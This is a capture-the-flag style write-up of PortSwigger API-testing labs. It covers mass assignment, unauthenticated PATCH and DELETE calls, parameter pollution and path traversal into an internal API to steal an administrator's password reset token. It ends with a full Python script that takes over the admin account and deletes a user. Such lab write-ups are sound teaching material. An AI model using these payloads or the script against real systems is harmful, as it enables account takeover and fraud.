# API Testing

### Lab 1: Using Documentation <a href="#lab-1-using-documentation" id="lab-1-using-documentation"></a>

To solve the lab, delete `carlos` using the API. When changing the email of the `wiener` user, I saw this `PATCH` request being sent:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-40d58c9703404ee86abb0578dd42333914cd0c4b%252Fportswigger-api-writeup-image.png%3Falt%3Dmedia%26token%3D73c28202-5f9e-4965-bc72-dd05df2db81d&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=ac784c20&#x26;sv=2" alt=""><figcaption></figcaption></figure>

PATCH is a HTTP method used to modify values of the resource properties. Since PATCH is used for modifying, DELETE is used for deleting.

Sending a DELETE request to `/api/user/carlos` works.

### Lab 2: Server-Side Parameter Pollution <a href="#lab-2-server-side-parameter-pollution" id="lab-2-server-side-parameter-pollution"></a>

To solve this, delete `carlos` as the `administrator` user. There is a forget password option for this lab:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-97e5b37a205a59008fa6ed6eb09c14f262c6001e%252Fportswigger-api-writeup-image-1.png%3Falt%3Dmedia%26token%3D1d7bdef6-f5b5-4e44-b53e-045de9fd5d6f&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=ae5f8190&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Sending a password reset request for `carlos` results in this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-fde76ede7c951cad1fb8b5eb164330ce41f73977%252Fportswigger-api-writeup-image-2.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=683757eb&#x26;sv=2" alt=""><figcaption></figcaption></figure>

After sending this request, I saw a `forgotPassword.js` file being used:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-2241d9fe762326d794fdd32cd00f58fac7a4e01e%252Fportswigger-api-writeup-image-3.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=48b864e&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Here's the important contents:

```javascript
let forgotPwdReady = (callback) => {
    if (document.readyState !== "loading") callback();
    else document.addEventListener("DOMContentLoaded", callback);
}s

function urlencodeFormData(fd){
    let s = '';
    function encode(s){ return encodeURIComponent(s).replace(/%20/g,'+'); }
    for(let pair of fd.entries()){
        if(typeof pair[1]=='string'){
            s += (s?'&':'') + encode(pair[0])+'='+encode(pair[1]);
        }
    }
    return s;
}

const validateInputsAndCreateMsg = () => {
    try {
        const forgotPasswordError = document.getElementById("forgot-password-error");
        forgotPasswordError.textContent = "";
        const forgotPasswordForm = document.getElementById("forgot-password-form");
        const usernameInput = document.getElementsByName("username").item(0);
        if (usernameInput && !usernameInput.checkValidity()) {
            usernameInput.reportValidity();
            return;
        }
        const formData = new FormData(forgotPasswordForm);
        const config = {
            method: "POST",
            headers: {
                "Content-Type": "x-www-form-urlencoded",
            },
            body: urlencodeFormData(formData)
        };
        fetch(window.location.pathname, config)
            .then(response => response.json())
            .then(jsonResponse => {
                if (!jsonResponse.hasOwnProperty("result"))
                {
                    forgotPasswordError.textContent = "Invalid username";
                }
                else
                {
                    forgotPasswordError.textContent = `Please check your email: "${jsonResponse.result}"`;
                    forgotPasswordForm.className = "";
                    forgotPasswordForm.style.display = "none";
                }
            })
            .catch(err => {
                forgotPasswordError.textContent = "Invalid username";
            });
    } catch (error) {
        console.error("Unexpected Error:", error);
    }
}

const displayMsg = (e) => {
    e.preventDefault();
    validateInputsAndCreateMsg(e);
};

forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

The one thing I am interested in is the `reset-token` value, since that allows me to reset the password of any user. The only thing that accepts user input is the `username` parameter when resetting the password.

Setting to `administrator&1=1` results in this error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-024ef9c203828b7c6e954e8215113903532bd168%252Fportswigger-api-writeup-image-4.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=3f609776&#x26;sv=2" alt=""><figcaption></figcaption></figure>

If I just modify the username, then it will tell me its invalid.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-f828b74a783c8831baa11a894ce54393d75fd8ff%252Fportswigger-api-writeup-image-5.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=7784e8fe&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So the `&` character is not parsed properly, and it is interpreted as including another POST parameter. Notice that there's a `type` of variable, meaning there's probably a parameter that IS supported and I can use to enumerate the types stored within this.

Fuzzing reveals that `field` is the parameter:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-5104fdb7a62ef7cb565e0a06ebc07e757eda6e5c%252Fportswigger-api-writeup-image-6.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=437c78af&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This returns a different response. Using this, I input the field as `reset-token` and `reset_token`. The latter returned a `reset_token` type:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-219bd674dedbfa0e8e8cfa36b5f457445194f4e4%252Fportswigger-api-writeup-image-7.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=1c2af5fa&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Visiting the `forget-password` directory with the correct token lets me reset the password:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-b52b40663a1cd1d1fe6d289f3f9631d610125c34%252Fportswigger-api-writeup-image-8.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a4fa7bc4&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I can then login and solve the lab.

### Lab 3: Undocumented API Endpoint <a href="#lab-3-undocumented-api-endpoint" id="lab-3-undocumented-api-endpoint"></a>

To solve this lab, buy the jacket. When viewing products, I noticed usage of an API:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-ca7d8e40f7a9cf2e1b776477be9a35bdd3c03b72%252Fportswigger-api-writeup-image-9.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=7dafeb96&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The first lab used PATCH to change values, and I tried this here and it worked:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a4ad594cc4ad4aca3859acaa45c4aede77528909%252Fportswigger-api-writeup-image-10.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=886a0b08&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I can then reset the price of the first product to 0.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-57fb60590369d850f537b181c2f80acf428d9d90%252Fportswigger-api-writeup-image-11.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=d211db97&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The jacket is then 'free'.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-d178c595940d50c028a507c5cf62648654be2a08%252Fportswigger-api-writeup-image-12.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=445537e7&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 4: Mass Assignment <a href="#lab-4-mass-assignment" id="lab-4-mass-assignment"></a>

To solve this lab, buy the jacket. When trying to checkout to buy any product, there is a GET and POST request to `/api/checkout` proxied:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-4ed105105b4a743b1858bd70755e717d3a67c1f9%252Fportswigger-api-writeup-image-13.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=3de821c8&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The POST request just has the `chosen_products` variable:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-c02b54b2dc7daee6539b8ce892a9fdf5d8c27650%252Fportswigger-api-writeup-image-14.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=cfc6d910&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Since there's a `chosen_discount` variable, I just added that to the POST request:

```http
{
"chosen_discount":{
    "percentage":100
},

"chosen_products":[
    {"product_id":"1",
    "quantity":1}
    ]
}
```

Sending the above solves the lab.

### Lab 5: Server-Side Parameter Pollution <a href="#lab-5-server-side-parameter-pollution" id="lab-5-server-side-parameter-pollution"></a>

To solve this lab, delete `carlos` as the `administrator`. There's a Forget Password feature for this lab:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-f3ee9d03ec804ea9ced57253b160d3f52caece38%252Fportswigger-api-writeup-image-15.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=34a00d87&#x26;sv=2" alt=""><figcaption></figcaption></figure>

As usual, there's a Javascript files used to process this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-fd96cc62cb9b9e7110e9b1d8252ec360b29fda66%252Fportswigger-api-writeup-image-16.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=ac07c6fe&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Altering the `username` parameter with a `#` character results in a unique error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-0ce1bbec501e4896b6ff3a5d804c53f7248c3b5c%252Fportswigger-api-writeup-image-17.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=6233a31c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

'Invalid route' is interesting, and it may mean that the `username` parameter is a path used by the API. Playing around with this and `../` eventually results in this unique error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-cf907e8cabdfceccbcb2eab2d66e89d79ca3de46%252Fportswigger-api-writeup-image-18.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9a21b11a&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So using 4 `../` means I have exited the API root. It keeps referring me to 'API documentation', and Portswigger academy does give me a few examples:

```
/api
/swagger/index.html
/openapi.json
```

Visiting `../../../../openapi.json` reveals a new error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-251b36757e375827661fce3ee7c2794e9b832895%252Fportswigger-api-writeup-image-19.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f1c7e834&#x26;sv=2" alt=""><figcaption></figcaption></figure>

There is one `path` variable which directs me to `/api/internal/v1/users/{username}/field/{field}`.

This is the same field variable as above. Additionally, the `forgotpassword.js` file uses a `passwordResetToken` variable. Attempting to visit `/api` using my browser doesn't work, meaning it might only be accessible on the backend via the `username` parameter.

Setting the `username` as `../../../../api/internal/v1/users/administrator/field/passwordResetToken` works in retrieving the token:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-925d3a0cb378ce069265d353a7169f56c4d25abe%252Fportswigger-api-writeup-image-20.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=b624341f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Using the above, I can reset the password, login, and delete `carlos`.

Now, I can script this entire process.

```bash
import requests
import re
import sys
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a0800dc041ee07980a185950066002a'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
s = requests.Session()

r = s.get(url + '/forgot-password', proxies=proxies, verify=False)
match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
reset_csrf_token = match[1]

## Generate passwordResetToken
reset_data = {
	'csrf':reset_csrf_token,
	'username':'administrator'
}
r = s.post(url + '/forgot-password', proxies=proxies, verify=False, data=reset_data)
if '*****@normal-user.net' not in r.text:
	print('[-] error with generating code')
	exit()

print('[+] generated code')

## retrieve code
r = s.get(url + '/forgot-password', proxies=proxies, verify=False)
match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
reset_csrf_token = match[1]

reset_data = {
	'csrf':reset_csrf_token,
	'username':'../../../../api/internal/v1/users/administrator/field/passwordResetToken#'
}
r = s.post(url + '/forgot-password', proxies=proxies, verify=False, data=reset_data)
if 'passwordResetToken' not in r.text:
	print('[-] error with generating code')
	exit()

match = re.search(r'result": "([0-9a-zA-z]+)', r.text)
if not match:
	print('[-] cannot find reset token')
password_token = match[1]
print(f'[+] found token: {password_token}')

## reset password
r = s.get(url + f'/forgot-password?passwordResetToken={password_token}', proxies=proxies, verify=False)
match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
reset_csrf_token = match[1]

password_data = {
	'csrf':reset_csrf_token,
	'passwordResetToken':password_token,
	'new-password-1':'test1234',
	'new-password-2':'test1234'
}

r = s.post(url + f'/forgot-password?passwordResetToken={password_token}', proxies=proxies, verify=False, data=password_data)

## login and solve
r = s.get(url + '/login', proxies=proxies, verify=False)
match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
login_csrf = match[1]

login_data = {
	'csrf':login_csrf,
	'username':'administrator',
	'password':'test1234'
}

r = s.post(url + '/login', proxies=proxies, verify=False, data=login_data)
if 'Your email is:' not in r.text:
	print('[-] login failed')
	exit()
print('[+] login worked')
s.get(url + '/admin/delete?username=carlos', proxies=proxies, verify=False)
```
